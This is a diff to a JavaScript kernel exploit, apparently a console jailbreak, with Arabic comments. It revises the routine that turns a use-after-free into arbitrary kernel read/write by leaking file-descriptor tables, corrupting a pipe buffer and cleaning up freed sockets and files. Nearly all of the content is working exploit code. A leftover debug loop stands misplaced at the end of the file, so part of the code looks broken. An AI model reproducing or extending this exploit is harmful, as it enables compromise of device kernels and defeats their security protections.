@@ -105,7 +105,7 @@ var CPU_LEVEL_WHICH = 3;
 var CPU_WHICH_TID = 1;
 var IOV_SIZE = 0x10;
 var CPU_SET_SIZE = 0x10;
-var PIPEBUF_SIZE = 0x18;
+var PIPEBUF_SIZE = 0x20;
 var MSG_HDR_SIZE = 0x30;
 var FILEDESCENT_SIZE = 0x8;
 var UCRED_SIZE = 0x168;
@@ -1027,71 +1027,85 @@ function exploit_phase_jailbreak() {
   jailbreak();
 }
 function setup_arbitrary_rw() {
-  debug('setup_arbitrary_rw - start');
+  log('Setting up arbitrary R/W...');
 
-  // حراسة على kq_fdp
+  // 1) تأكيد إن kq_fdp صالح
   if (kq_fdp.eq(0)) {
-    log('setup_arbitrary_rw: invalid kq_fdp (0)');
-    throw new Error(' Jailbreak failed - Reboot and try again');
+    cleanup();
+    throw new Error(' Jailbreak failed - invalid kq_fdp');
   }
 
-  // Leak fd_files from kq_fdp.
+  // 2) قراءة fd_files
   var fd_files = kreadslow64_safe(kq_fdp);
-  fdt_ofiles = fd_files.add(0x00);
-  debug('fdt_ofiles: ' + hex(fdt_ofiles));
-
-  // تأكيد صلاحية master_pipe / victim_pipe
-  if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
-    log('setup_arbitrary_rw: invalid pipe fds');
-    throw new Error(' Jailbreak failed - Reboot and try again');
+  if (fd_files.eq(BigInt_Error)) {
+    cleanup();
+    throw new Error(' Jailbreak failed - fd_files leak failed');
   }
 
+  fdt_ofiles = fd_files;
+
+  // 3) تأكيد صلاحية master/victim pipes
+  if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
+    cleanup();
+    throw new Error(' Jailbreak failed - invalid pipe fds');
+  }
+
+  // 4) قراءة file pointers
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
-  debug('master_r_pipe_file: ' + hex(master_r_pipe_file));
-
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
-  debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file));
 
+  if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
+    cleanup();
+    throw new Error(' Jailbreak failed - pipe file leak failed');
+  }
+
+  // 5) قراءة pipe data
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
-  debug('master_r_pipe_data: ' + hex(master_r_pipe_data));
-
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
-  debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data));
 
-  // Corrupt pipebuf of masterRpipeFd.
-  write32(master_pipe_buf.add(0x00), 0);          // cnt
-  write32(master_pipe_buf.add(0x04), 0);          // in
-  write32(master_pipe_buf.add(0x08), 0);          // out
-  write32(master_pipe_buf.add(0x0C), PAGE_SIZE);  // size
-  write64(master_pipe_buf.add(0x10), victim_r_pipe_data); // buffer
+  if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
+    cleanup();
+    throw new Error(' Jailbreak failed - pipe data leak failed');
+  }
+
+  // 6) تأكيد إن pipe data valid
+  if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
+    cleanup();
+    throw new Error(' Jailbreak failed - invalid pipe data');
+  }
+
+  // 7) تعديل pipebuf
+  write32(master_pipe_buf.add(0x00), 0);
+  write32(master_pipe_buf.add(0x04), 0);
+  write32(master_pipe_buf.add(0x08), 0);
+  write32(master_pipe_buf.add(0x0C), PAGE_SIZE);
+  write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
 
   var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
   if (ret_write.eq(BigInt_Error)) {
     cleanup();
-    throw new Error(' Jailbreak failed - Reboot and try again');
+    throw new Error(' Jailbreak failed - pipebuf write failed');
   }
 
-  // Increase reference counts for the pipes.
+  // 8) زيادة refcount
   fhold(fget(master_pipe[0]));
   fhold(fget(master_pipe[1]));
   fhold(fget(victim_pipe[0]));
   fhold(fget(victim_pipe[1]));
 
-  // Remove rthdr pointers from triplets
+  // 9) تنظيف rthdr
   remove_rthr_from_socket(ipv6_socks[triplets[0]]);
   remove_rthr_from_socket(ipv6_socks[triplets[1]]);
   remove_rthr_from_socket(ipv6_socks[triplets[2]]);
 
-  // Remove triple freed file from free list
+  // 10) إزالة الملف الثلاثي freed
   remove_uaf_file();
 
-  for (var i = 0; i < 0x20; i = i + 8) {
-    var readed = kread64(master_r_pipe_data.add(i));
-    debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed));
-  }
-
+  // 11) نجاح
   log('Arbitrary R/W achieved');
-  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)));
+
+  // 12) انتقال نظيف
+  yield_to_render(exploit_phase_jailbreak);
 }
 
 function find_allproc() {
@@ -2393,4 +2407,12 @@ try {
   if (typeof show_fail === 'function') {
     show_fail();
   }
+}
+
+
+
+// شيل ده كله
+for (var i = 0; i < 0x20; i = i + 8) {
+  var readed = kread64(master_r_pipe_data.add(i));
+  debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed));
 }
